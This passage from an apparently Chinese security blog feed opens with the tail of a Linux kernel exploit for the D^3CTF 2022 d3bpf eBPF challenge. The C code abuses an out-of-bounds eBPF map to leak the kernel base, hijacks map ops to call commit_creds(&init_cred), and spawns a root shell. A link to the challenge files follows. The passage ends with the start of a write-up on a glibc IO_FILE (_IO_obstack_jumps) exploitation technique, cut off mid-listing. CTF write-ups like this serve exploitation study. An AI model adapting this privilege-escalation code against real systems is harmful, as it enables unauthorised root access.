BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),                          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> oob_map_fd, <span class="keyword">int</span> store_map_fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0xD0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">8</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = oob_map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ((<span class="keyword">uint64_t</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(read_map_ops_content[<span class="number">0</span>]), &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// save_status();</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> store_map_fd = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> oob_map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (store_map_fd &lt; <span class="number">0</span> || oob_map_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops, <span class="keyword">sizeof</span>(read_map_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> array_map_ops = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path_addr = <span class="number">0x1a6c240</span> + kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path =&gt; %p\n&quot;</span>, modprobe_path_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span> - <span class="number">0xc0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr, <span class="keyword">sizeof</span>(read_map_addr) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_ptr = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gap =&gt; %p\n&quot;</span>, (modprobe_path_addr - map_ptr));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x79706f432f00</span></span><br><span class="line"></span><br><span class="line">    read_kernel(oob_map_fd, store_map_fd, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(values + <span class="number">8</span> * <span class="number">4</span>)) = work_for_cpu_fn_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get_ops!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x20</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x28</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x28</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x30</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ops[<span class="number">4</span>] = commit_creds_addr;</span><br><span class="line">    ops[<span class="number">5</span>] = init_creds_addr;</span><br><span class="line">    ops[<span class="number">6</span>] = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, ops, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] updated oob_map&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = oob_map_fd,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230106194449337.png"                      alt="image-20230106194449337"                ></p><hr><p>题目放在: <a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>house of lalala</title>
    <link href="https://cv196082.gitee.io/2022/12/01/house-of-lalala/"/>
    <id>https://cv196082.gitee.io/2022/12/01/house-of-lalala/</id>
    <published>2022-12-01T05:45:58.000Z</published>
    <updated>2022-12-01T05:45:28.861Z</updated>
    
    <content type="html"><![CDATA[<p>近期又出现一个新的关于<code>IO_FILE</code>的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>此次聚焦的vtable表为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要利用的结构体为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是在<code>IO_FILE</code>结构体下加一个<code>obstack</code>结构体指针。下面则是<code>obstack</code>结构体的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="keyword">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="keyword">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="keyword">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="keyword">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="keyword">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="keyword">void</span> (*freefun) (<span class="keyword">void</span> *, struct _obstack_chunk *);</span><br><span class="line">  <span class="keyword">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="keyword">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="keyword">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，上述的vtable中只有<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code>这样两个函数，首先关注前一个</p><h3 id="IO-obstack-overflow"><a href="#IO-obstack-overflow" class="headerlink" title="_IO_obstack_overflow"></a>_IO_obstack_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_obstack_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);</span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其中存在一个assert，注意下面如果我们走exit这条路来清空所有缓存时触发的话就会出现rsi必定为<code>-1</code>的情况，所以此路不通</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201130547767.png"                      alt="image-20221201130547767"                ></p><h3 id="IO-obstack-xsputn"><a href="#IO-obstack-xsputn" class="headerlink" title="_IO_obstack_xsputn"></a>_IO_obstack_xsputn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment"> space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们的目标时调用到<code>obstack_grow</code>函数，所以我们需要进入这个if语句，这一点很好说，如果我们可以控制这个结构体就可以非常轻松的控制这里的值而后进入if语句，随后又会执行<code>obstack_blank_fast</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</span><br></pre></td></tr></table></figure><p>这个其实是一个宏定义，可以看到内部其实不会特别影响后续的内容。在继续执行就会进入我们期望的函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 